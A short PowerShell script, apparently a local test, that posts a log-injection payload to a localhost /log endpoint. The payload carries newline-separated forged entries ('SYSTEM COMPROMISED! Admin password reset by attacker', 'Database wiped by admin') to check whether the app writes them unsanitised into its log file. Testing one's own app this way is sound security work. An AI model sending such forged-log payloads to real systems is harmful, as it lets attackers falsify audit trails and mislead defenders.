$uri = "http://localhost:5000/log"
$maliciousMessage = @"
Normal log message
2025-06-27 12:00:00 [ERR] SYSTEM COMPROMISED! Admin password reset by attacker
2025-06-27 12:00:01 [ERR] Database wiped by admin
"@

# Encode the double quotes properly for JSON
$body = ConvertTo-Json -InputObject $maliciousMessage -Compress

$headers = @{
    "Content-Type" = "application/json"
}

Write-Host "Sending malicious payload with log injection attempt:"
Write-Host $maliciousMessage
Write-Host "-----------------------------------"
Write-Host "JSON Body:"
Write-Host $body
Write-Host "-----------------------------------"

try {
    $response = Invoke-WebRequest -Uri $uri -Method Post -Body $body -Headers $headers
    Write-Host "Status Code: $($response.StatusCode)"
    Write-Host "Response: $($response.Content)"
} catch {
    Write-Host "Error: $_"
}

Write-Host "-----------------------------------"
Write-Host "Check the log file in logs/app.log for the results"
